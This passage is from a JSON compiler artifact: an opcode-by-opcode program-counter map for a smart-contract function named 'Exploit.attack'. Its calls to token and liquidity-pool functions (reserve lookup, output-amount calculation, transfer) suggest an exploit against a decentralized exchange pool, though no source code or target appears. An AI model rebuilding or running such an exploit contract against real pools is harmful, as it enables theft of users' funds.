      "op": "PUSH1",
      "value": "0x1"
    },
    "3423": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3425": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3427": {
      "op": "SHL"
    },
    "3428": {
      "op": "SUB"
    },
    "3429": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4725
      ],
      "op": "AND",
      "path": "0"
    },
    "3430": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4725
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x902F1AC"
    },
    "3435": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3437": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3438": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3439": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "3444": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "AND",
      "path": "0"
    },
    "3445": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "3447": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "SHL",
      "path": "0"
    },
    "3448": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3449": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3450": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3452": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "ADD",
      "path": "0"
    },
    "3453": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "3455": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3457": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3458": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3459": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3460": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "SUB",
      "path": "0"
    },
    "3461": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3462": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3463": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "GAS",
      "path": "0"
    },
    "3464": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3465": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3466": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3467": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3468": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD99"
    },
    "3471": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3472": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3473": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3475": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3476": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3477": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3478": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3480": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3481": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3482": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "POP",
      "path": "0"
    },
    "3483": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "POP",
      "path": "0"
    },
    "3484": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "POP",
      "path": "0"
    },
    "3485": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "POP",
      "path": "0"
    },
    "3486": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3488": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3489": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3490": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3492": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "NOT",
      "path": "0"
    },
    "3493": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3495": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3496": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "ADD",
      "path": "0"
    },
    "3497": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "AND",
      "path": "0"
    },
    "3498": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3499": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "ADD",
      "path": "0"
    },
    "3500": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3501": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3503": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3504": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "POP",
      "path": "0"
    },
    "3505": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3506": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "ADD",
      "path": "0"
    },
    "3507": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3508": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xDBD"
    },
    "3511": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3512": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3513": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1376"
    },
    "3516": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        4670,
        4727
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3517": {
      "fn": "Exploit.attack",
      "offset": [
        4670,
        4727
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3518": {
      "op": "POP"
    },
    "3519": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4808
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x12"
    },
    "3521": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4808
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3522": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3524": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3525": {
      "op": "PUSH4",
      "value": "0x1535435"
    },
    "3530": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "3532": {
      "op": "SHL"
    },
    "3533": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3534": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3535": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3537": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3538": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "ADD",
      "path": "0"
    },
    "3539": {
      "op": "DUP8"
    },
    "3540": {
      "op": "SWAP1"
    },
    "3541": {
      "op": "MSTORE"
    },
    "3542": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3544": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3546": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "3548": {
      "op": "SHL"
    },
    "3549": {
      "op": "SUB"
    },
    "3550": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3551": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3552": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "AND",
      "path": "0"
    },
    "3553": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3555": {
      "op": "DUP3"
    },
    "3556": {
      "op": "ADD"
    },
    "3557": {
      "op": "DUP2"
    },
    "3558": {
      "op": "SWAP1"
    },
    "3559": {
      "op": "MSTORE"
    },
    "3560": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "3561": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3562": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3563": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "AND",
      "path": "0"
    },
    "3564": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "3566": {
      "op": "DUP4"
    },
    "3567": {
      "op": "ADD"
    },
    "3568": {
      "op": "DUP2"
    },
    "3569": {
      "op": "SWAP1"
    },
    "3570": {
      "op": "MSTORE"
    },
    "3571": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "3572": {
      "op": "POP"
    },
    "3573": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3574": {
      "fn": "Exploit.attack",
      "offset": [
        4635,
        4727
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3575": {
      "op": "POP"
    },
    "3576": {
      "fn": "Exploit.attack",
      "offset": [
        4763,
        4774
      ],
      "op": "DUP5",
      "path": "0"
    },
    "3577": {
      "fn": "Exploit.attack",
      "offset": [
        4763,
        4774
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3578": {
      "fn": "Exploit.attack",
      "offset": [
        4746,
        4760
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3580": {
      "fn": "Exploit.attack",
      "offset": [
        4746,
        4760
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3581": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3583": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3585": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3587": {
      "op": "SHL"
    },
    "3588": {
      "op": "SUB"
    },
    "3589": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4808
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3590": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4808
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3591": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4808
      ],
      "op": "AND",
      "path": "0"
    },
    "3592": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4808
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3593": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4821
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x54D50D4"
    },
    "3598": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4821
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3599": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "3601": {
      "op": "ADD"
    },
    "3602": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3604": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3606": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3607": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3608": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3609": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "SUB",
      "path": "0"
    },
    "3610": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3611": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP7",
      "path": "0"
    },
    "3612": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "GAS",
      "path": "0"
    },
    "3613": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "3614": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3615": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3616": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3617": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xE2E"
    },
    "3620": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3621": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3622": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3624": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3625": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3626": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3627": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3629": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3630": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3631": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "POP",
      "path": "0"
    },
    "3632": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "POP",
      "path": "0"
    },
    "3633": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "POP",
      "path": "0"
    },
    "3634": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "POP",
      "path": "0"
    },
    "3635": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3637": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3638": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3639": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3641": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "NOT",
      "path": "0"
    },
    "3642": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3644": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3645": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "ADD",
      "path": "0"
    },
    "3646": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "AND",
      "path": "0"
    },
    "3647": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3648": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "ADD",
      "path": "0"
    },
    "3649": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3650": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3652": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3653": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "POP",
      "path": "0"
    },
    "3654": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3655": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "ADD",
      "path": "0"
    },
    "3656": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3657": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xE52"
    },
    "3660": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3661": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3662": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C6"
    },
    "3665": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        4802,
        4852
      ],
      "op": "JUMP",
      "path": "0"
    },
    "3666": {
      "fn": "Exploit.attack",
      "offset": [
        4802,
        4852
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3667": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4866
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 17,
      "value": "0x2"
    },
    "3669": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4866
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3670": {
      "fn": "Exploit.attack",
      "offset": [
        4884,
        4913
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x10"
    },
    "3672": {
      "fn": "Exploit.attack",
      "offset": [
        4884,
        4913
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3673": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3675": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3676": {
      "op": "PUSH4",
      "value": "0xA9059CBB"
    },
    "3681": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3683": {
      "op": "SHL"
    },
    "3684": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3685": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "3686": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3688": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "3690": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "3692": {
      "op": "SHL"
    },
    "3693": {
      "op": "SUB"
    },
    "3694": {
      "fn": "Exploit.attack",
      "offset": [
        4884,
        4913
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "3695": {
      "fn": "Exploit.attack",
      "offset": [
        4884,
        4913
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3696": {
      "fn": "Exploit.attack",
      "offset": [
        4884,
        4913
      ],
      "op": "AND",
      "path": "0"
    },
    "3697": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "3699": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3700": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "ADD",
      "path": "0"
    },
    "3701": {
      "op": "MSTORE"
    },
    "3702": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "3704": {
      "op": "DUP2"
    },
    "3705": {
      "op": "ADD"
    },
    "3706": {
      "op": "DUP7"
    },
    "3707": {
      "op": "SWAP1"
    },
    "3708": {
      "op": "MSTORE"
    },
    "3709": {
      "fn": "Exploit.attack",
      "offset": [
        4784,
        4852
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "3710": {
      "fn": "Exploit.attack",
      "offset": [
        4784,
        4852
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "3711": {
      "op": "POP"
    },
    "3712": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4866
      ],
      "op": "AND",
      "path": "0"
    },
    "3713": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4866
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3714": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4875
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xA9059CBB"
    },
    "3719": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4875
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "3720": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "3722": {
      "op": "ADD"
    },
    "3723": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "3725": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3727": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3728": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3729": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP4",
      "path": "0"
    },
    "3730": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "SUB",
      "path": "0"
    },
    "3731": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3732": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3734": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP8",
      "path": "0"
    },
    "3735": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "GAS",
      "path": "0"
    },
    "3736": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "CALL",
      "path": "0"
    },
    "3737": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3738": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3739": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3740": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xEA9"
    },
    "3743": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3744": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3745": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3747": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3748": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3749": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3750": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3752": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3753": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3754": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "POP",
      "path": "0"
    },
    "3755": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "POP",
      "path": "0"
    },
    "3756": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "POP",
      "path": "0"
    },
    "3757": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "POP",
      "path": "0"
    },
    "3758": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3760": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3761": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3762": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3764": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "NOT",
      "path": "0"
    },
    "3765": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "3767": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3768": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "ADD",
      "path": "0"
    },
    "3769": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "AND",
      "path": "0"
    },
    "3770": {
      "fn": "Exploit.attack",
      "offset": [
        4862,
        4926
      ],
      "op": "DUP3",
      "path": "0"
    },
    "3771": {
      "fn": "Exploit.attack",
      "offset": [
